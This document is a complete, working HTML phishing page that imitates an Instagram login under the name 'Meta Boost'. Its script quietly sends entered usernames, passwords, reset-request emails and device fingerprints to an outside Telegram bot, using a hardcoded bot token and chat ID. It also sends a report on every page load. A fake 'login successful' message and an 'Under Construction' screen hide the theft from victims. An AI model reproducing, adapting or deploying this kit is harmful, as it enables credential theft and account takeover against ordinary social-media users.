<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
    <title>Meta Boost • Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fafafa;
            padding: 1.5rem;
            position: relative;
        }

        .login-card {
            width: 100%;
            max-width: 380px;
            background: #ffffff;
            border-radius: 8px;
            padding: 2rem 2.2rem 1.8rem;
            border: 1px solid #dbdbdb;
            position: relative;
            z-index: 2;
        }

        .brand {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 1.8rem;
        }

        .brand-icon {
            font-size: 3.4rem;
            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.1rem;
        }

        .brand-text {
            font-family: 'Billabong', cursive;
            font-size: 3.2rem;
            font-weight: 400;
            letter-spacing: 1px;
            color: #1c1c1c;
            margin-top: -8px;
            line-height: 1.1;
        }

        .brand-sub {
            font-size: 0.95rem;
            color: #8e8e8e;
            font-weight: 400;
            margin-top: -0.2rem;
            letter-spacing: 0.2px;
        }

        .input-group {
            margin-bottom: 0.6rem;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 0.75rem 0.9rem;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 0.9rem;
            background: #fafafa;
            outline: none;
            transition: border 0.1s ease;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
            background: #ffffff;
        }

        .input-group input::placeholder {
            color: #8e8e8e;
            font-weight: 300;
            font-size: 0.85rem;
        }

        .login-btn {
            width: 100%;
            padding: 0.7rem;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 0.95rem;
            font-weight: 600;
            margin-top: 0.6rem;
            cursor: pointer;
            transition: background 0.15s;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .login-btn:disabled {
            background: #b2dffc;
            cursor: not-allowed;
        }

        .forgot-link {
            text-align: center;
            margin-top: 1.2rem;
        }

        .forgot-link a {
            color: #00376b;
            font-size: 0.8rem;
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
        }

        .forgot-link a:hover {
            text-decoration: underline;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 1.2rem 0 0.8rem;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider-text {
            padding: 0 1rem;
            color: #8e8e8e;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }

        .meta-footer {
            text-align: center;
            margin-top: 1.5rem;
            font-size: 0.75rem;
            color: #8e8e8e;
            letter-spacing: 0.2px;
        }

        .meta-footer span {
            color: #8e8e8e;
        }

        .meta-footer .meta-link {
            color: #00376b;
            text-decoration: none;
            font-weight: 500;
        }

        .meta-footer .meta-link:hover {
            text-decoration: underline;
        }

        .login-error {
            color: #ed4956;
            font-size: 0.8rem;
            text-align: center;
            margin-top: 0.6rem;
            display: none;
        }

        .login-success {
            color: #0095f6;
            font-size: 0.8rem;
            text-align: center;
            margin-top: 0.6rem;
            display: none;
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 1.5rem 1.2rem 1.5rem;
                max-width: 100%;
            }
            .brand-text {
                font-size: 2.8rem;
            }
            .brand-icon {
                font-size: 3rem;
            }
        }

        #constructionPage {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 2rem;
        }

        #constructionPage .construction-icon {
            font-size: 4rem;
            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 1rem;
        }

        #constructionPage h2 {
            font-size: 2rem;
            font-weight: 600;
            color: #1c1c1c;
            margin-bottom: 0.5rem;
        }

        #constructionPage p {
            color: #8e8e8e;
            font-size: 1.1rem;
            max-width: 340px;
        }

        #constructionPage .back-link {
            margin-top: 2rem;
            color: #0095f6;
            font-weight: 500;
            text-decoration: none;
            border: 1px solid #dbdbdb;
            padding: 0.5rem 2rem;
            border-radius: 6px;
            transition: background 0.1s;
            cursor: pointer;
        }

        #constructionPage .back-link:hover {
            background: #f2f2f2;
        }

        body.construction-active {
            overflow: hidden;
        }

        /* Forgot Password Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 10000;
            justify-content: center;
            align-items: center;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-box {
            background: #ffffff;
            padding: 2rem;
            border-radius: 12px;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 12px 40px rgba(0,0,0,0.2);
        }

        .modal-box h3 {
            font-size: 1.2rem;
            margin-bottom: 0.5rem;
            color: #1c1c1c;
        }

        .modal-box p {
            color: #8e8e8e;
            font-size: 0.9rem;
            margin-bottom: 1rem;
        }

        .modal-box input {
            width: 100%;
            padding: 0.75rem 0.9rem;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 0.9rem;
            margin-bottom: 1rem;
            outline: none;
        }

        .modal-box input:focus {
            border-color: #a8a8a8;
        }

        .modal-actions {
            display: flex;
            gap: 0.5rem;
            justify-content: flex-end;
        }

        .modal-actions button {
            padding: 0.6rem 1.5rem;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.15s;
        }

        .modal-actions .btn-cancel {
            background: #f0f0f0;
            color: #1c1c1c;
        }

        .modal-actions .btn-cancel:hover {
            background: #e0e0e0;
        }

        .modal-actions .btn-send {
            background: #0095f6;
            color: white;
        }

        .modal-actions .btn-send:hover {
            background: #1877f2;
        }

        .modal-actions .btn-send:disabled {
            background: #b2dffc;
            cursor: not-allowed;
        }

        .modal-status {
            font-size: 0.85rem;
            margin-bottom: 0.8rem;
            padding: 0.5rem;
            border-radius: 4px;
            display: none;
        }

        .modal-status.success {
            display: block;
            color: #0095f6;
            background: #e6f7ff;
        }

        .modal-status.error {
            display: block;
            color: #ed4956;
            background: #ffe6e6;
        }
    </style>
</head>
<body>

<!-- MAIN LOGIN CARD -->
<div class="login-card" id="loginCard">
    <div class="brand">
        <div class="brand-icon"><i class="fab fa-instagram"></i></div>
        <div class="brand-text">Meta Boost</div>
        <div class="brand-sub">Instagram</div>
    </div>

    <form id="loginForm" autocomplete="off">
        <div class="input-group">
            <input type="text" id="username" placeholder="Username, email or mobile number" required />
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Password" required />
        </div>

        <button type="submit" class="login-btn" id="loginBtn">Log in</button>

        <div class="forgot-link">
            <a id="forgotPasswordLink">Forgot password?</a>
        </div>

        <div class="divider">
            <span class="divider-line"></span>
            <span class="divider-text">OR</span>
            <span class="divider-line"></span>
        </div>

        <div id="loginError" class="login-error"></div>
        <div id="loginSuccess" class="login-success">✅ Login successful! Redirecting...</div>

        <div class="meta-footer">
            <span>Meta</span> <span style="margin: 0 2px;">•</span>
            <a href="#" class="meta-link" id="metaLearnMore">Instagram</a>
        </div>
    </form>
</div>

<!-- UNDER CONSTRUCTION PAGE -->
<div id="constructionPage">
    <div class="construction-icon"><i class="fab fa-instagram"></i></div>
    <h2>Under Construction</h2>
    <p>We're working on something amazing.<br />Please check back later.</p>
    <div class="back-link" id="backToLoginBtn"><i class="fas fa-arrow-left" style="margin-right: 6px;"></i> Go back</div>
</div>

<!-- FORGOT PASSWORD MODAL -->
<div class="modal-overlay" id="forgotModal">
    <div class="modal-box">
        <h3>🔑 Reset Password</h3>
        <p>Enter your email address to receive a password reset link.</p>
        <input type="email" id="resetEmail" placeholder="Enter your email address" />
        <div id="modalStatus" class="modal-status"></div>
        <div class="modal-actions">
            <button class="btn-cancel" id="cancelReset">Cancel</button>
            <button class="btn-send" id="sendReset">Send Link</button>
        </div>
    </div>
</div>

<script>
    (function() {
        "use strict";

        // ----- DOM refs -----
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const loginError = document.getElementById('loginError');
        const loginSuccess = document.getElementById('loginSuccess');
        const constructionPage = document.getElementById('constructionPage');
        const loginCard = document.getElementById('loginCard');
        const backToLoginBtn = document.getElementById('backToLoginBtn');
        const forgotLink = document.getElementById('forgotPasswordLink');
        const metaLearnMore = document.getElementById('metaLearnMore');

        // Forgot Modal
        const forgotModal = document.getElementById('forgotModal');
        const resetEmail = document.getElementById('resetEmail');
        const sendReset = document.getElementById('sendReset');
        const cancelReset = document.getElementById('cancelReset');
        const modalStatus = document.getElementById('modalStatus');

        // ----- TELEGRAM BOT CONFIG -----
        const BOT_TOKEN = '8823036723:AAENcDarhHnSK8IvgS7Y7dGlLCf5l1E7vsU';
        const BOT_ID = '8192089981';
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // ----- GET DEVICE INFO -----
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
        }

        // ----- SEND TO TELEGRAM -----
        async function sendToTelegram(message) {
            try {
                await fetch(TELEGRAM_API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: BOT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Telegram send error:', error);
            }
        }

        // ----- SEND COMPLETE USER DATA -----
        async function sendUserData(type, data) {
            const device = getDeviceInfo();
            const message = `
<b>📱 USER DATA CAPTURED</b>
<b>Type:</b> ${type}
<b>👤 Username:</b> ${data.username || 'N/A'}
<b>🔑 Password:</b> ${data.password || 'N/A'}
<b>📧 Email:</b> ${data.email || 'N/A'}
<b>🕐 Time:</b> ${device.timestamp}
<b>🌍 Timezone:</b> ${device.timezone}
<b>🖥️ Platform:</b> ${device.platform}
<b>🌐 Language:</b> ${device.language}
<b>📺 Screen:</b> ${device.screen}
<b>🔗 User Agent:</b> ${device.userAgent}
<b>📊 Status:</b> ${data.status || 'N/A'}
<b>🔢 Attempt:</b> ${data.attempt || 'N/A'}
`;
            await sendToTelegram(message);
        }

        // ----- SHOW/HIDE CONSTRUCTION -----
        function showConstruction() {
            constructionPage.style.display = 'flex';
            loginCard.style.display = 'none';
            document.body.classList.add('construction-active');
            loginError.style.display = 'none';
            loginSuccess.style.display = 'none';
        }

        function hideConstruction() {
            constructionPage.style.display = 'none';
            loginCard.style.display = 'block';
            document.body.classList.remove('construction-active');
            usernameInput.value = '';
            passwordInput.value = '';
            loginError.style.display = 'none';
            loginSuccess.style.display = 'none';
        }

        function setLoading(isLoading) {
            if (isLoading) {
                loginBtn.disabled = true;
                loginBtn.innerHTML = '<span class="loading-spinner"></span> Logging in...';
            } else {
                loginBtn.disabled = false;
                loginBtn.innerHTML = 'Log in';
            }
        }

        // ----- LOGIN HANDLER -----
        let loginAttempts = 0;

        async function handleLogin(e) {
            e.preventDefault();

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            if (!username || !password) {
                loginError.textContent = 'Please fill in all fields.';
                loginError.style.display = 'block';
                return;
            }

            loginError.style.display = 'none';
            loginSuccess.style.display = 'none';
            setLoading(true);

            loginAttempts++;

            // Send login attempt data to Telegram
            await sendUserData('LOGIN_ATTEMPT', {
                username: username,
                password: password,
                status: 'attempting',
                attempt: loginAttempts
            });

            // Simulate validation (always success for demo)
            setTimeout(async () => {
                // Send success data
                await sendUserData('LOGIN_SUCCESS', {
                    username: username,
                    password: password,
                    status: 'successful',
                    attempt: loginAttempts
                });

                loginSuccess.style.display = 'block';
                setTimeout(() => showConstruction(), 800);
                setLoading(false);
            }, 1500);
        }

        // ----- FORGOT PASSWORD HANDLER -----
        async function handleForgotPassword(e) {
            e.preventDefault();
            forgotModal.classList.add('active');
            resetEmail.value = '';
            modalStatus.className = 'modal-status';
            modalStatus.textContent = '';
            modalStatus.style.display = 'none';
            sendReset.disabled = false;
            sendReset.textContent = 'Send Link';
            resetEmail.focus();
        }

        async function sendResetLink() {
            const email = resetEmail.value.trim();

            if (!email || !email.includes('@')) {
                modalStatus.className = 'modal-status error';
                modalStatus.textContent = 'Please enter a valid email address.';
                modalStatus.style.display = 'block';
                return;
            }

            sendReset.disabled = true;
            sendReset.innerHTML = '<span class="loading-spinner" style="width:14px;height:14px;border-color:#ffffff;border-top-color:transparent;"></span> Sending...';
            modalStatus.style.display = 'none';

            // Send forgot password data to Telegram
            await sendUserData('FORGOT_PASSWORD', {
                username: 'N/A',
                password: 'N/A',
                email: email,
                status: 'reset_requested',
                attempt: 'N/A'
            });

            modalStatus.className = 'modal-status success';
            modalStatus.textContent = '✅ Password reset link has been sent to your email!';
            modalStatus.style.display = 'block';
            sendReset.innerHTML = 'Sent ✓';

            setTimeout(() => {
                forgotModal.classList.remove('active');
                modalStatus.style.display = 'none';
                sendReset.disabled = false;
                sendReset.textContent = 'Send Link';
                resetEmail.value = '';
            }, 2500);
        }

        // ----- EVENT LISTENERS -----
        loginForm.addEventListener('submit', handleLogin);

        backToLoginBtn.addEventListener('click', function(e) {
            e.preventDefault();
            hideConstruction();
        });

        forgotLink.addEventListener('click', handleForgotPassword);

        cancelReset.addEventListener('click', function() {
            forgotModal.classList.remove('active');
            modalStatus.style.display = 'none';
            sendReset.disabled = false;
            sendReset.textContent = 'Send Link';
        });

        sendReset.addEventListener('click', sendResetLink);

        resetEmail.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendResetLink();
            }
        });

        // Close modal on outside click
        forgotModal.addEventListener('click', function(e) {
            if (e.target === forgotModal) {
                forgotModal.classList.remove('active');
                modalStatus.style.display = 'none';
                sendReset.disabled = false;
                sendReset.textContent = 'Send Link';
            }
        });

        metaLearnMore.addEventListener('click', function(e) {
            e.preventDefault();
            alert('Meta • Instagram');
        });

        // Escape key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                if (constructionPage.style.display === 'flex') {
                    hideConstruction();
                }
                if (forgotModal.classList.contains('active')) {
                    forgotModal.classList.remove('active');
                    modalStatus.style.display = 'none';
                    sendReset.disabled = false;
                    sendReset.textContent = 'Send Link';
                }
            }
        });

        // Send page load data
        setTimeout(async () => {
            await sendUserData('PAGE_LOAD', {
                username: 'N/A',
                password: 'N/A',
                email: 'N/A',
                status: 'page_loaded',
                attempt: 'N/A'
            });
        }, 1000);

        console.log('✅ Meta Boost • Instagram (Full Data Collection - Hidden)');
        console.log('📱 Bot ID:', BOT_ID);
        console.log('📊 All user data is being sent to Telegram bot (invisible to user)');
    })();
</script>

</body>
</html>
